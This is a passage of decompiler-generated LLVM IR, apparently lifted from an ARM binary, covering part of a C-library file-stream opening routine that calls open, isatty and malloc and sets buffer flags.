  %v0_17110 = phi i32 [ %v0_17110.pre, %dec_label_pc_170f4.dec_label_pc_1710c_crit_edge ], [ %v0_170e8, %dec_label_pc_170e8 ]
  %v0_1710c = phi i32 [ %v0_1710c.pre, %dec_label_pc_170f4.dec_label_pc_1710c_crit_edge ], [ %v1_170e8, %dec_label_pc_170e8 ]
  %v1_1710c = and i32 %v0_1710c, 131072
  store i32 %v1_1710c, i32* %r3.global-to-local, align 4
  %v2_17110 = or i32 %v1_1710c, %v0_17110
  store i32 %v2_17110, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1713c

dec_label_pc_17118:                               ; preds = %dec_label_pc_170c0
  %v2_17118 = icmp eq i32 %v0_17118, -1
  store i1 %v2_17118, i1* %cpsr_c.global-to-local, align 1
  %v7_17118 = icmp eq i32 %v0_17118, -1
  %v0_17124.pre = load i32, i32* @r4, align 4
  br i1 %v7_17118, label %dec_label_pc_17118._crit_edge, label %bb54

bb54:                                             ; preds = %dec_label_pc_17118
  %v2_1711c = or i32 %v0_17124.pre, 131072
  store i32 %v2_1711c, i32* @r4, align 4
  br label %dec_label_pc_17118._crit_edge

dec_label_pc_17118._crit_edge:                    ; preds = %dec_label_pc_17118, %bb54
  %v0_17124 = phi i32 [ %v2_1711c, %bb54 ], [ %v0_17124.pre, %dec_label_pc_17118 ]
  %v0_17120 = load i32, i32* @r7, align 4
  store i32 %v0_17120, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_1712c = call i32 @__libc_open(i32 %v0_17120, i32 %v0_17124)
  store i32 %v2_1712c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_17130 = icmp slt i32 %v2_1712c, 0
  %v1_17134 = load i32, i32* @r5, align 4
  %v2_17134 = add i32 %v1_17134, 4
  %v3_17134 = inttoptr i32 %v2_17134 to i32*
  store i32 %v2_1712c, i32* %v3_17134, align 4
  br i1 %v1_17130, label %dec_label_pc_17040, label %.dec_label_pc_1713c_crit_edge

.dec_label_pc_1713c_crit_edge:                    ; preds = %dec_label_pc_17118._crit_edge
  %v0_17140.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1713c

dec_label_pc_1713c:                               ; preds = %.dec_label_pc_1713c_crit_edge, %dec_label_pc_1710c
  %v0_17158 = phi i32 [ %v0_17140.pre, %.dec_label_pc_1713c_crit_edge ], [ %v2_17110, %dec_label_pc_1710c ]
  %v0_1713c = load i32, i32* @r5, align 4
  %v1_1713c = inttoptr i32 %v0_1713c to i16*
  %v2_1713c = load i16, i16* %v1_1713c, align 2
  %v3_1713c = zext i16 %v2_1713c to i32
  %v1_17140 = urem i32 %v0_17158, 4
  %v1_17144 = and i32 %v0_17158, 1024
  %v1_17148 = and i32 %v3_1713c, 8192
  %v1_1714c = add nuw nsw i32 %v1_17140, 1
  %v2_17150 = or i32 %v1_17148, %v1_17144
  store i32 %v2_17150, i32* %r3.global-to-local, align 4
  %v1_17154 = xor i32 %v1_1714c, 3
  %v1_17158 = and i32 %v0_17158, 131072
  store i32 %v1_17158, i32* %r2.global-to-local, align 4
  %v2_17158 = icmp eq i32 %v1_17158, 0
  %v1_1715c = add i32 %v0_1713c, 4
  %v2_1715c = inttoptr i32 %v1_1715c to i32*
  %v3_1715c = load i32, i32* %v2_1715c, align 4
  store i32 %v3_1715c, i32* @r4, align 4
  br i1 %v2_17158, label %bb56, label %bb55

bb55:                                             ; preds = %dec_label_pc_1713c
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_1713c, %bb55
  %v0_17168 = phi i32 [ 0, %dec_label_pc_1713c ], [ 32768, %bb55 ]
  %v4_17164 = mul nuw nsw i32 %v1_17154, 16
  %v5_17164 = or i32 %v2_17150, %v4_17164
  store i32 %v5_17164, i32* %r3.global-to-local, align 4
  %v2_17168 = or i32 %v0_17168, %v5_17164
  store i32 %v2_17168, i32* %r2.global-to-local, align 4
  %v2_1716c = icmp ugt i32 %v3_1715c, 2147483646
  store i1 %v2_1716c, i1* %cpsr_c.global-to-local, align 1
  %v8_1716c = icmp eq i32 %v3_1715c, 2147483647
  %v1_17170 = trunc i32 %v2_17168 to i16
  store i16 %v1_17170, i16* %v1_1713c, align 2
  br i1 %v8_1716c, label %dec_label_pc_171b0, label %dec_label_pc_17178

dec_label_pc_17178:                               ; preds = %bb56
  store i32 48864, i32* %r3.global-to-local, align 4
  %v0_1717c = call i32 @__aeabi_read_tp()
  %v3_17180 = load i16, i16* @global_var_23068.363, align 2
  %v4_17180 = sext i16 %v3_17180 to i32
  store i32 %v4_17180, i32* @r3, align 4
  store i32 %v0_1717c, i32* @r6, align 4
  %v0_17188 = load i32, i32* @r4, align 4
  store i32 %v0_17188, i32* @r0, align 4
  %v2_1718c = add i32 %v4_17180, %v0_1717c
  %v3_1718c = inttoptr i32 %v2_1718c to i32*
  %v4_1718c = load i32, i32* %v3_1718c, align 4
  store i32 %v4_1718c, i32* @r4, align 4
  %v1_17190 = call i32 @isatty(i32 %v0_17188)
  store i32 %v1_17190, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17194 = icmp eq i32 %v1_17190, 0
  br i1 %v2_17194, label %.thread6, label %bb57

bb57:                                             ; preds = %dec_label_pc_17178
  %v1_17198 = load i32, i32* @r5, align 4
  %v2_17198 = inttoptr i32 %v1_17198 to i16*
  %v3_17198 = load i16, i16* %v2_17198, align 2
  %v4_17198 = zext i16 %v3_17198 to i32
  %v2_1719c = or i32 %v4_17198, 256
  store i32 %v2_1719c, i32* %r3.global-to-local, align 4
  %v2_171a0 = trunc i32 %v2_1719c to i16
  store i16 %v2_171a0, i16* %v2_17198, align 2
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_17178, %bb57
  %v3_171a8 = load i16, i16* @global_var_23068.363, align 2
  %v4_171a8 = sext i16 %v3_171a8 to i32
  store i32 %v4_171a8, i32* %r3.global-to-local, align 4
  %v0_171ac = load i32, i32* @r4, align 4
  %v1_171ac = load i32, i32* @r6, align 4
  %v3_171ac = add i32 %v1_171ac, %v4_171a8
  %v4_171ac = inttoptr i32 %v3_171ac to i32*
  store i32 %v0_171ac, i32* %v4_171ac, align 4
  br label %dec_label_pc_171b0

dec_label_pc_171b0:                               ; preds = %bb56, %.thread6
  %v0_171b0 = load i32, i32* @r5, align 4
  %v1_171b0 = add i32 %v0_171b0, 8
  %v2_171b0 = inttoptr i32 %v1_171b0 to i32*
  %v3_171b0 = load i32, i32* %v2_171b0, align 4
  store i32 %v3_171b0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_171b4 = icmp eq i32 %v3_171b0, 0
  br i1 %v2_171b4, label %dec_label_pc_171bc, label %bb58

dec_label_pc_171bc:                               ; preds = %dec_label_pc_171b0
  store i32 4096, i32* @r0, align 4
  %v0_171c0 = call i32 @malloc()
  store i32 %v0_171c0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_171c4 = icmp eq i32 %v0_171c0, 0
  %v1_171d4.pre = load i32, i32* @r5, align 4
  br i1 %v2_171c4, label %.thread10, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_171bc
  %v2_171c8 = inttoptr i32 %v1_171d4.pre to i16*
  %v3_171c8 = load i16, i16* %v2_171c8, align 2
  %v4_171c8 = zext i16 %v3_171c8 to i32
  %v2_171cc = add i32 %v0_171c0, 4096
  store i32 %v2_171cc, i32* %r2.global-to-local, align 4
  %v2_171d0 = or i32 %v4_171c8, 16384
  store i32 %v2_171d0, i32* %r3.global-to-local, align 4
  %v2_171d4 = add i32 %v1_171d4.pre, 8
  %v3_171d4 = inttoptr i32 %v2_171d4 to i32*
  store i32 %v0_171c0, i32* %v3_171d4, align 4
  %v1_171d8 = load i32, i32* %r2.global-to-local, align 4
  %v2_171d8 = load i32, i32* @r5, align 4
  %v3_171d8 = add i32 %v2_171d8, 12
  %v4_171d8 = inttoptr i32 %v3_171d8 to i32*
  store i32 %v1_171d8, i32* %v4_171d8, align 4
  %v1_171dc = load i32, i32* %r3.global-to-local, align 4
  %v2_171dc = trunc i32 %v1_171dc to i16
  %v3_171dc = load i32, i32* @r5, align 4
  %v4_171dc = inttoptr i32 %v3_171dc to i16*
  store i16 %v2_171dc, i16* %v4_171dc, align 2
  br label %bb58

.thread10:                                        ; preds = %dec_label_pc_171bc
  %v2_171d438 = add i32 %v1_171d4.pre, 8
  %v3_171d439 = inttoptr i32 %v2_171d438 to i32*
  store i32 0, i32* %v3_171d439, align 4
  %v2_171e0 = load i32, i32* @r5, align 4
  %v3_171e0 = add i32 %v2_171e0, 12
  %v4_171e0 = inttoptr i32 %v3_171e0 to i32*
  store i32 0, i32* %v4_171e0, align 4
  br label %bb58

bb58:                                             ; preds = %.thread9, %dec_label_pc_171b0, %.thread10
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_171ec = load i32, i32* @r8, align 4
  %v2_171ec = add i32 %v0_171ec, 92
  %v3_171ec = inttoptr i32 %v2_171ec to i32*
  %v4_171ec = load i32, i32* %v3_171ec, align 4
  store i32 %v4_171ec, i32* %r3.global-to-local, align 4
  %v2_171f0 = load i32, i32* @r5, align 4
  %v3_171f0 = add i32 %v2_171f0, 2
  %v4_171f0 = inttoptr i32 %v3_171f0 to i8*
  store i8 0, i8* %v4_171f0, align 1
  %v0_171f4 = load i32, i32* @r5, align 4
  %v1_171f4 = inttoptr i32 %v0_171f4 to i16*
  %v2_171f4 = load i16, i16* %v1_171f4, align 2
  %v3_171f4 = zext i16 %v2_171f4 to i32
  store i32 %v3_171f4, i32* %r2.global-to-local, align 4
  %v0_171f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_171f8 = inttoptr i32 %v0_171f8 to i32*
  %v2_171f8 = load i32, i32* %v1_171f8, align 4
  store i32 %v2_171f8, i32* @r1, align 4
  %v1_171fc = add i32 %v0_171f4, 8
  %v2_171fc = inttoptr i32 %v1_171fc to i32*
  %v3_171fc = load i32, i32* %v2_171fc, align 4
  store i32 %v3_171fc, i32* %r3.global-to-local, align 4
  %v1_17200 = and i32 %v3_171f4, 8192
  %v2_17200 = icmp eq i32 %v1_17200, 0
  %v2_17204 = add i32 %v0_171f4, 20
  %v3_17204 = inttoptr i32 %v2_17204 to i32*
  store i32 %v3_171fc, i32* %v3_17204, align 4
  %v0_17208 = load i32, i32* @r1, align 4
  %v1_17208 = load i32, i32* @r5, align 4
  %v2_17208 = add i32 %v1_17208, 52
  %v3_17208 = inttoptr i32 %v2_17208 to i32*
  store i32 %v0_17208, i32* %v3_17208, align 4
  %v0_1720c = load i32, i32* %r3.global-to-local, align 4
  %v1_1720c = load i32, i32* @r5, align 4
  %v2_1720c = add i32 %v1_1720c, 24
  %v3_1720c = inttoptr i32 %v2_1720c to i32*
  store i32 %v0_1720c, i32* %v3_1720c, align 4
  %v0_17210 = load i32, i32* %r3.global-to-local, align 4
  %v1_17210 = load i32, i32* @r5, align 4
  %v2_17210 = add i32 %v1_17210, 28
  %v3_17210 = inttoptr i32 %v2_17210 to i32*
  store i32 %v0_17210, i32* %v3_17210, align 4
  %v0_17214 = load i32, i32* %r3.global-to-local, align 4
  %v1_17214 = load i32, i32* @r5, align 4
  %v2_17214 = add i32 %v1_17214, 16
  %v3_17214 = inttoptr i32 %v2_17214 to i32*
  store i32 %v0_17214, i32* %v3_17214, align 4
  %v0_17218 = load i32, i32* %r4.global-to-local, align 4
  %v1_17218 = load i32, i32* @r5, align 4
  %v2_17218 = add i32 %v1_17218, 44
  %v3_17218 = inttoptr i32 %v2_17218 to i32*
  store i32 %v0_17218, i32* %v3_17218, align 4
  br i1 %v2_17200, label %dec_label_pc_17400, label %dec_label_pc_17220

dec_label_pc_17220:                               ; preds = %bb58
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17224 = load i32, i32* @r8, align 4
  %v2_17224 = add i32 %v0_17224, 160
  %v3_17224 = inttoptr i32 %v2_17224 to i32*
  %v4_17224 = load i32, i32* %v3_17224, align 4
  store i32 %v4_17224, i32* %r7.global-to-local, align 4
  %v0_17228 = call i32 @__aeabi_read_tp()
  store i32 %v0_17228, i32* %r0.global-to-local, align 4
  %v1_1722c = add i32 %v4_17224, 8
  %v2_1722c = inttoptr i32 %v1_1722c to i32*
  %v3_1722c = load i32, i32* %v2_1722c, align 4
  store i32 %v3_1722c, i32* %r3.global-to-local, align 4
  %v1_17230 = add i32 %v0_17228, -1168
  store i32 %v1_17230, i32* %r6.global-to-local, align 4
  %v3_17234 = icmp uge i32 %v3_1722c, %v1_17230
  store i1 %v3_17234, i1* %cpsr_c.global-to-local, align 1
  %v9_17234 = icmp eq i32 %v3_1722c, %v1_17230
  br i1 %v9_17234, label %dec_label_pc_17278, label %dec_label_pc_1723c

dec_label_pc_1723c:                               ; preds = %dec_label_pc_17220
  store i32 %v4_17224, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17244

dec_label_pc_17244:                               ; preds = %dec_label_pc_17250.dec_label_pc_17244_crit_edge, %dec_label_pc_1723c
  %v0_17244 = phi i32 [ %v0_17244.pre, %dec_label_pc_17250.dec_label_pc_17244_crit_edge ], [ %v4_17224, %dec_label_pc_1723c ]
  %v1_17244 = inttoptr i32 %v0_17244 to i32*
  %v2_17244 = load i32, i32* %v1_17244, align 4
  store i32 %v2_17244, i32* %r3.global-to-local, align 4
  %v1_17248 = load i32, i32* %r4.global-to-local, align 4
  %v3_17248 = icmp uge i32 %v2_17244, %v1_17248
  store i1 %v3_17248, i1* %cpsr_c.global-to-local, align 1
  %v9_17248 = icmp eq i32 %v2_17244, %v1_17248
  br i1 %v9_17248, label %dec_label_pc_17250, label %dec_label_pc_17268

dec_label_pc_17250:                               ; preds = %dec_label_pc_17244
  store i32 %v2_17244, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17260 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17260, label %dec_label_pc_17264, label %dec_label_pc_17250.dec_label_pc_17244_crit_edge

dec_label_pc_17250.dec_label_pc_17244_crit_edge:  ; preds = %dec_label_pc_17250
  %v0_17244.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17244

dec_label_pc_17264:                               ; preds = %dec_label_pc_17250
  %v0_17264 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17264, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17268

dec_label_pc_17268:                               ; preds = %dec_label_pc_17244, %dec_label_pc_17264
  %v0_17268 = phi i32 [ %v0_17264, %dec_label_pc_17264 ], [ %v2_17244, %dec_label_pc_17244 ]
  %v1_17268 = phi i32 [ %v0_17264, %dec_label_pc_17264 ], [ %v1_17248, %dec_label_pc_17244 ]
  %v3_17268 = icmp uge i32 %v0_17268, %v1_17268
  store i1 %v3_17268, i1* %cpsr_c.global-to-local, align 1
  %v9_17268 = icmp eq i32 %v0_17268, %v1_17268
  br i1 %v9_17268, label %bb60, label %bb59

bb59:                                             ; preds = %dec_label_pc_17268
  %v1_1726c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1726c, i32* %r0.global-to-local, align 4
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_17268, %bb59
  %v1_17270 = xor i1 %v9_17268, true
  call void @__pseudo_cond_branch(i1 %v1_17270, i32 ptrtoint (i32* @global_var_154bc.522 to i32))
  %v0_17274 = load i32, i32* %r6.global-to-local, align 4
  %v1_17274 = load i32, i32* %r7.global-to-local, align 4
  %v2_17274 = add i32 %v1_17274, 8
  %v3_17274 = inttoptr i32 %v2_17274 to i32*
  store i32 %v0_17274, i32* %v3_17274, align 4
  %v1_17294.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17278

dec_label_pc_17278:                               ; preds = %dec_label_pc_17220, %bb60
  %v1_17294 = phi i32 [ %v3_1722c, %dec_label_pc_17220 ], [ %v1_17294.pre, %bb60 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1727c = load i32, i32* @r8, align 4
  %v2_1727c = add i32 %v0_1727c, 160
  %v3_1727c = inttoptr i32 %v2_1727c to i32*
  %v4_1727c = load i32, i32* %v3_1727c, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_17284 = add i32 %v0_1727c, 152
  %v3_17284 = inttoptr i32 %v2_17284 to i32*
  %v4_17284 = load i32, i32* %v3_17284, align 4
  store i32 %v4_17284, i32* %r7.global-to-local, align 4
  %v1_17288 = add i32 %v4_1727c, 4
  %v2_17288 = inttoptr i32 %v1_17288 to i32*
  %v3_17288 = load i32, i32* %v2_17288, align 4
  store i32 %v3_17288, i32* %r3.global-to-local, align 4
  %v1_1728c = add i32 %v4_17284, 8
  %v2_1728c = inttoptr i32 %v1_1728c to i32*
  %v3_1728c = load i32, i32* %v2_1728c, align 4
  store i32 %v3_1728c, i32* %r2.global-to-local, align 4
  %v1_17290 = add i32 %v3_17288, 1
  store i32 %v1_17290, i32* %r3.global-to-local, align 4
  %v3_17294 = icmp uge i32 %v3_1728c, %v1_17294
  store i1 %v3_17294, i1* %cpsr_c.global-to-local, align 1
  %v9_17294 = icmp eq i32 %v3_1728c, %v1_17294
  store i32 %v1_17290, i32* %v2_17288, align 4
  br i1 %v9_17294, label %dec_label_pc_172e0, label %dec_label_pc_172a0

dec_label_pc_172a0:                               ; preds = %dec_label_pc_17278
  %v0_172a4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_172a4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_172ac96 = inttoptr i32 %v0_172a4 to i32*
  %v2_172ac97 = load i32, i32* %v1_172ac96, align 4
  store i32 %v2_172ac97, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_172b099 = icmp eq i32 %v2_172ac97, 0
  br i1 %v9_172b099, label %dec_label_pc_172b8, label %dec_label_pc_172d0

dec_label_pc_172b8:                               ; preds = %dec_label_pc_172a0, %dec_label_pc_172b8.dec_label_pc_172ac_crit_edge
  %v0_172b8100 = phi i32 [ %v1_172b0.pre, %dec_label_pc_172b8.dec_label_pc_172ac_crit_edge ], [ 0, %dec_label_pc_172a0 ]
  store i32 %v0_172b8100, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_172c8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_172c8, label %dec_label_pc_172cc, label %dec_label_pc_172b8.dec_label_pc_172ac_crit_edge

dec_label_pc_172b8.dec_label_pc_172ac_crit_edge:  ; preds = %dec_label_pc_172b8
  %v0_172ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_172b0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_172ac = inttoptr i32 %v0_172ac.pre to i32*
  %v2_172ac = load i32, i32* %v1_172ac, align 4
  store i32 %v2_172ac, i32* %r3.global-to-local, align 4
  %v3_172b0 = icmp uge i32 %v2_172ac, %v1_172b0.pre
  store i1 %v3_172b0, i1* %cpsr_c.global-to-local, align 1
  %v9_172b0 = icmp eq i32 %v2_172ac, %v1_172b0.pre
  br i1 %v9_172b0, label %dec_label_pc_172b8, label %dec_label_pc_172d0

dec_label_pc_172cc:                               ; preds = %dec_label_pc_172b8
  %v0_172cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_172cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_172d0

dec_label_pc_172d0:                               ; preds = %dec_label_pc_172a0, %dec_label_pc_172b8.dec_label_pc_172ac_crit_edge, %dec_label_pc_172cc
  %v0_172d0 = phi i32 [ %v0_172cc, %dec_label_pc_172cc ], [ %v2_172ac97, %dec_label_pc_172a0 ], [ %v2_172ac, %dec_label_pc_172b8.dec_label_pc_172ac_crit_edge ]
  %v1_172d0 = phi i32 [ %v0_172cc, %dec_label_pc_172cc ], [ 0, %dec_label_pc_172a0 ], [ %v1_172b0.pre, %dec_label_pc_172b8.dec_label_pc_172ac_crit_edge ]
  %v3_172d0 = icmp uge i32 %v0_172d0, %v1_172d0
  store i1 %v3_172d0, i1* %cpsr_c.global-to-local, align 1
  %v9_172d0 = icmp eq i32 %v0_172d0, %v1_172d0
  br i1 %v9_172d0, label %bb62, label %bb61

bb61:                                             ; preds = %dec_label_pc_172d0
  %v1_172d4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_172d4, i32* %r0.global-to-local, align 4
  br label %bb62

bb62:                                             ; preds = %dec_label_pc_172d0, %bb61
  %v1_172d8 = xor i1 %v9_172d0, true
  call void @__pseudo_cond_branch(i1 %v1_172d8, i32 ptrtoint (i32* @global_var_154bc.522 to i32))
  %v0_172dc = load i32, i32* %r6.global-to-local, align 4
  %v1_172dc = load i32, i32* %r7.global-to-local, align 4
  %v2_172dc = add i32 %v1_172dc, 8
  %v3_172dc = inttoptr i32 %v2_172dc to i32*
  store i32 %v0_172dc, i32* %v3_172dc, align 4
  br label %dec_label_pc_172e0

dec_label_pc_172e0:                               ; preds = %dec_label_pc_17278, %bb62
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_172e4 = load i32, i32* @r8, align 4
  %v2_172e4 = add i32 %v0_172e4, 152
  %v3_172e4 = inttoptr i32 %v2_172e4 to i32*
  %v4_172e4 = load i32, i32* %v3_172e4, align 4
  store i32 %v4_172e4, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_172ec = add i32 %v0_172e4, 76
  %v3_172ec = inttoptr i32 %v2_172ec to i32*
  %v4_172ec = load i32, i32* %v3_172ec, align 4
  store i32 %v4_172ec, i32* @r1, align 4
  %v1_172f0 = add i32 %v4_172e4, 4
  %v2_172f0 = inttoptr i32 %v1_172f0 to i32*
  %v3_172f0 = load i32, i32* %v2_172f0, align 4
  store i32 %v3_172f0, i32* %r3.global-to-local, align 4
  %v1_172f4 = inttoptr i32 %v4_172ec to i32*
  %v2_172f4 = load i32, i32* %v1_172f4, align 4
  store i32 %v2_172f4, i32* %r2.global-to-local, align 4
  %v1_172f8 = add i32 %v3_172f0, 1
  store i32 %v1_172f8, i32* %r3.global-to-local, align 4
  store i32 %v1_172f8, i32* %v2_172f0, align 4
  %v0_17300 = load i32, i32* %r2.global-to-local, align 4
  %v1_17300 = load i32, i32* @r5, align 4
  %v2_17300 = add i32 %v1_17300, 32
  %v3_17300 = inttoptr i32 %v2_17300 to i32*
  store i32 %v0_17300, i32* %v3_17300, align 4
  %v0_17304 = load i32, i32* %r0.global-to-local, align 4
  %v1_17304 = add i32 %v0_17304, 4
  %v2_17304 = inttoptr i32 %v1_17304 to i32*
  %v3_17304 = load i32, i32* %v2_17304, align 4
  %v1_17308 = add i32 %v3_17304, -1
  store i32 %v1_17308, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1730c = icmp eq i32 %v1_17308, 0
  %v0_17310 = load i32, i32* @r5, align 4
  %v1_17310 = load i32, i32* @r1, align 4
  %v2_17310 = inttoptr i32 %v1_17310 to i32*
  store i32 %v0_17310, i32* %v2_17310, align 4
  %v0_17314 = load i32, i32* %r3.global-to-local, align 4
  %v1_17314 = load i32, i32* %r0.global-to-local, align 4
  %v2_17314 = add i32 %v1_17314, 4
  %v3_17314 = inttoptr i32 %v2_17314 to i32*
  store i32 %v0_17314, i32* %v3_17314, align 4
  br i1 %v2_1730c, label %dec_label_pc_1731c, label %dec_label_pc_1737c

dec_label_pc_1731c:                               ; preds = %dec_label_pc_172e0
  %v0_1731c = load i32, i32* %r3.global-to-local, align 4
  %v1_1731c = load i32, i32* %r0.global-to-local, align 4
  %v2_1731c = add i32 %v1_1731c, 8
  %v3_1731c = inttoptr i32 %v2_1731c to i32*
  store i32 %v0_1731c, i32* %v3_1731c, align 4
  %v0_17320 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17320, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17324

dec_label_pc_17324:                               ; preds = %dec_label_pc_17354.dec_label_pc_17324_crit_edge, %dec_label_pc_1731c
  %v0_17324 = phi i32 [ %v0_17324.pre, %dec_label_pc_17354.dec_label_pc_17324_crit_edge ], [ %v0_17320, %dec_label_pc_1731c ]
  %v1_17324 = inttoptr i32 %v0_17324 to i32*
  %v2_17324 = load i32, i32* %v1_17324, align 4
  store i32 %v2_17324, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_17324, i32* %r2.global-to-local, align 4
  %v2_1733084 = load i32, i32* %v1_17324, align 4
  store i32 %v2_1733084, i32* %r3.global-to-local, align 4
  %v3_1733486 = icmp uge i32 %v2_1733084, %v2_17324
  store i1 %v3_1733486, i1* %cpsr_c.global-to-local, align 1
  %v9_1733492 = icmp eq i32 %v2_1733084, %v2_17324
  br i1 %v9_1733492, label %dec_label_pc_1733c, label %dec_label_pc_17354

dec_label_pc_1733c:                               ; preds = %dec_label_pc_17324, %dec_label_pc_1733c.dec_label_pc_17330_crit_edge
  %v0_1733c93 = phi i32 [ %v1_17334.pre, %dec_label_pc_1733c.dec_label_pc_17330_crit_edge ], [ %v2_17324, %dec_label_pc_17324 ]
  store i32 %v0_1733c93, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1734c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1734c, label %dec_label_pc_17350, label %dec_label_pc_1733c.dec_label_pc_17330_crit_edge

dec_label_pc_1733c.dec_label_pc_17330_crit_edge:  ; preds = %dec_label_pc_1733c
  %v0_17330.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17334.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17330 = inttoptr i32 %v0_17330.pre to i32*
  %v2_17330 = load i32, i32* %v1_17330, align 4
  store i32 %v2_17330, i32* %r3.global-to-local, align 4
  %v3_17334 = icmp uge i32 %v2_17330, %v1_17334.pre
  store i1 %v3_17334, i1* %cpsr_c.global-to-local, align 1
  %v9_17334 = icmp eq i32 %v2_17330, %v1_17334.pre
  br i1 %v9_17334, label %dec_label_pc_1733c, label %dec_label_pc_17354

dec_label_pc_17350:                               ; preds = %dec_label_pc_1733c
  %v0_17350 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17350, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17354

dec_label_pc_17354:                               ; preds = %dec_label_pc_17324, %dec_label_pc_1733c.dec_label_pc_17330_crit_edge, %dec_label_pc_17350
  %v0_1735c = phi i32 [ %v0_17350, %dec_label_pc_17350 ], [ %v2_1733084, %dec_label_pc_17324 ], [ %v2_17330, %dec_label_pc_1733c.dec_label_pc_17330_crit_edge ]
  %v1_17354 = phi i32 [ %v0_17350, %dec_label_pc_17350 ], [ %v2_17324, %dec_label_pc_17324 ], [ %v1_17334.pre, %dec_label_pc_1733c.dec_label_pc_17330_crit_edge ]
  %v3_17354 = icmp uge i32 %v0_1735c, %v1_17354
  store i1 %v3_17354, i1* %cpsr_c.global-to-local, align 1
  %v9_17354 = icmp eq i32 %v0_1735c, %v1_17354
  br i1 %v9_17354, label %dec_label_pc_1735c, label %dec_label_pc_17354.dec_label_pc_17324_crit_edge

dec_label_pc_17354.dec_label_pc_17324_crit_edge:  ; preds = %dec_label_pc_17354
  %v0_17324.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17324

dec_label_pc_1735c:                               ; preds = %dec_label_pc_17354
  %v2_1735c = icmp ne i32 %v1_17354, 0
  store i1 %v2_1735c, i1* %cpsr_c.global-to-local, align 1
  %v7_17360 = icmp slt i32 %v1_17354, 2
  br i1 %v7_17360, label %dec_label_pc_1737c, label %dec_label_pc_17364

dec_label_pc_17364:                               ; preds = %dec_label_pc_1735c
  %v0_17364 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17364, i32* %r0.global-to-local, align 4
  %v0_17368 = load i32, i32* @r1, align 4
  %v1_17368 = add i32 %v0_17368, 129
  store i32 %v1_17368, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1737c

dec_label_pc_1737c:                               ; preds = %dec_label_pc_172e0, %dec_label_pc_17364, %dec_label_pc_1735c
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17380 = load i32, i32* @r8, align 4
  %v2_17380 = add i32 %v0_17380, 160
  %v3_17380 = inttoptr i32 %v2_17380 to i32*
  %v4_17380 = load i32, i32* %v3_17380, align 4
  store i32 %v4_17380, i32* %r0.global-to-local, align 4
  %v1_17384 = add i32 %v4_17380, 4
  %v2_17384 = inttoptr i32 %v1_17384 to i32*
  %v3_17384 = load i32, i32* %v2_17384, align 4
  %v1_17388 = add i32 %v3_17384, -1
  store i32 %v1_17388, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1738c = icmp eq i32 %v1_17388, 0
  store i32 %v1_17388, i32* %v2_17384, align 4
  br i1 %v2_1738c, label %dec_label_pc_17398, label %dec_label_pc_17400

dec_label_pc_17398:                               ; preds = %dec_label_pc_1737c
  %v0_17398 = load i32, i32* %r3.global-to-local, align 4
  %v1_17398 = load i32, i32* %r0.global-to-local, align 4
  %v2_17398 = add i32 %v1_17398, 8
  %v3_17398 = inttoptr i32 %v2_17398 to i32*
  store i32 %v0_17398, i32* %v3_17398, align 4
